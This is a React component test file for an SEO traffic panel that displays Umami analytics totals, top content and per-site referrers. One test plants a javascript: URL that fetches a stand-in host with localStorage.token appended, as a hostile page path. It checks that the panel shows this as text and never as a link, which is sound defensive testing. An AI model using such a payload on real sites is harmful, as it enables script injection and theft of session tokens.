import { render, screen, waitFor, within } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import { MemoryRouter } from "react-router-dom";
import { beforeEach, describe, expect, it, vi } from "vitest";
import TrafficPanel from "./TrafficPanel";
import { api } from "../../lib/api";
import { ROUTER_FUTURE } from "../../lib/routerFuture";

vi.mock("../../lib/api", () => ({
  api: { seoTraffic: vi.fn() },
}));

function traffic(overrides = {}) {
  return {
    days: 30,
    generated_at: "2026-10-22T10:00:00Z",
    umami_configured: true,
    umami_error: null,
    totals: { pageviews: 1000, visitors: 240, search_visits: 90 },
    top_content: [
      { site_key: "tax", domain: "tax.doaide.com", path: "/blog/file-itr", url: "https://tax.doaide.com/blog/file-itr", views: 120, is_content: true, content_id: 5, title: "File ITR online" },
      { site_key: "gst", domain: "gst.doaide.com", path: "/guides/gst", url: "https://gst.doaide.com/guides/gst", views: 40, is_content: true, content_id: null, title: null },
    ],
    sites: [
      {
        key: "tax",
        name: "Tax",
        domain: "tax.doaide.com",
        status: "ok",
        error: null,
        pageviews: 500,
        visitors: 120,
        search_visits: 90,
        top_pages: [{ path: "/", url: "https://tax.doaide.com/", views: 300, is_content: false, content_id: null, title: null }],
        referrers: [
          { referrer: "www.google.com", visits: 90, search: true },
          { referrer: "t.co", visits: 30, search: false },
        ],
      },
      { key: "cortex", name: "Cortex", domain: "cortex.doaide.com", status: "not_found", error: "No Umami site for cortex.doaide.com", top_pages: [], referrers: [] },
    ],
    ...overrides,
  };
}

function draw() {
  return render(
    <MemoryRouter future={ROUTER_FUTURE}>
      <TrafficPanel />
    </MemoryRouter>,
  );
}

describe("TrafficPanel", () => {
  beforeEach(() => {
    vi.clearAllMocks();
  });

  it("shows totals, the content driving traffic and each site", async () => {
    api.seoTraffic.mockResolvedValue(traffic());
    draw();

    expect(await screen.findByText("75%")).toBeInTheDocument(); // 90 of 120 referred visits
    const top = screen.getByRole("region", { name: "Content driving traffic" });
    expect(within(top).getByRole("link", { name: "File ITR online" })).toHaveAttribute("href", "/content/5");
    expect(within(top).getByRole("link", { name: "/guides/gst" })).toHaveAttribute(
      "href",
      "https://gst.doaide.com/guides/gst",
    );
    const cortex = screen.getByRole("article", { name: "cortex.doaide.com" });
    expect(cortex).toHaveTextContent("No Umami site for cortex.doaide.com");
    expect(screen.getByText("(search)")).toBeInTheDocument();
  });

  it("never links a reported path that is not a web address", async () => {
    // Umami takes page views from anyone, so a "path" can be anything at all.
    const planted = "javascript:fetch('//x/?'+localStorage.token)";
    api.seoTraffic.mockResolvedValue(
      traffic({
        top_content: [
          { site_key: "tax", domain: "tax.doaide.com", path: planted, url: planted, views: 9, is_content: true, content_id: null, title: null },
        ],
      }),
    );
    draw();

    const top = await screen.findByRole("region", { name: "Content driving traffic" });
    expect(within(top).getByText(planted)).toBeInTheDocument();
    expect(within(top).queryByRole("link", { name: planted })).not.toBeInTheDocument();
  });

  it("changes the window and refreshes past the cache", async () => {
    api.seoTraffic.mockResolvedValue(traffic());
    draw();
    await screen.findByText("75%");

    await userEvent.click(screen.getByRole("button", { name: "7d" }));
    expect(api.seoTraffic).toHaveBeenLastCalledWith(7);
    await userEvent.click(screen.getByRole("button", { name: "Refresh" }));
    expect(api.seoTraffic).toHaveBeenLastCalledWith(7, { refresh: true });
  });

  it("says when Umami is not configured", async () => {
    api.seoTraffic.mockResolvedValue(
      traffic({ umami_configured: false, umami_error: "Umami is not configured (set UMAMI_USERNAME and UMAMI_PASSWORD).", sites: [], top_content: [] }),
    );
    draw();
    // The loading announcement is a status too; this waits for the one meant.
    await waitFor(() => expect(screen.getByRole("status")).toHaveTextContent("UMAMI_USERNAME"));
    expect(screen.queryByRole("region", { name: "Content driving traffic" })).not.toBeInTheDocument();
  });
});
